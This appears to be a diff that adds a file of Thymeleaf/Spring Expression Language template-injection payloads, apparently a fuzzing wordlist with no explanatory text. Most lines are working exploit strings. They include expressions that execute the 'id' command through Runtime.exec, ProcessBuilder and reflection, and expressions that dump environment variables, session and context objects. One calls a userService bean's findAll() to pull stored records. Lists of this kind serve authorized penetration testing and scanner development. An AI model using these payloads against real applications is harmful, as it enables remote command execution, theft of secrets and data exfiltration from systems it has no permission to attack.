@@ -1,0 +1,19 @@
+__${7*7}__::.x
+__${T(java.lang.System).getenv()}__::.x
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+[[${7*7}]]
+[(${7*7})]
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.ProcessBuilder).new('id').start()}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()}__::.x
+[[${#request.servletContext.classLoader.parent.parent.getResources('').nextElement().toString()}]]
+[[${#httpServletRequest.getAttribute('org.springframework.web.servlet.DispatcherServlet.CONTEXT').getBean('userService').findAll()}]]
+th:utext="${userInput}"
+th:text="${userInput}"
+[[${application}]]
+[[${session}]]
+[[${#ctx}]]
+[[${#vars}]]
+[[${T(java.lang.Class).forName('java.lang.Runtime').getMethod('exec',String).invoke(T(java.lang.Runtime).getRuntime(),'id')}]]
